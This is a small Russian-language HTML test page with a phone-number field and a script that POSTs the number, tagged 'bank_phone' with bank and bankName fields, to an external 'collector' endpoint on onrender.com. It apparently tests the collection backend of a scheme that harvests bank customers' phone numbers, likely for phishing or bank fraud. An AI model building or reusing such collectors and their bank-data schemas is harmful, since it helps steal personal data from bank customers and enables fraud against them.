<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Тест сервера</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            max-width: 400px;
            margin: 0 auto;
        }
        input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 8px;
            margin-bottom: 10px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #c9a44b;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
        }
        #log {
            margin-top: 20px;
            background: #1e1e2f;
            color: #10b981;
            padding: 14px;
            border-radius: 8px;
            font-size: 13px;
            white-space: pre-wrap;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <h2>Тест связи с сервером</h2>
    <input type="tel" id="phone" placeholder="9001234567">
    <button onclick="test()">Отправить на сервер</button>
    <div id="log">Ожидание...</div>

    <script>
        async function test() {
            const log = document.getElementById('log');
            const phone = document.getElementById('phone').value;
            
            log.textContent = 'Отправка...';
            
            try {
                const response = await fetch('https://collector-bh3t.onrender.com/api/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'bank_phone',
                        phone: '+7' + phone,
                        bank: 'test',
                        bankName: 'Тестовый банк',
                        timestamp: new Date().toISOString()
                    })
                });
                
                const result = await response.json();
                log.textContent = '✅ УСПЕХ\nСтатус: ' + response.status + '\nОтвет: ' + JSON.stringify(result);
            } catch (e) {
                log.textContent = '❌ ОШИБКА\n' + e.message;
            }
        }
    </script>
</body>
</html>
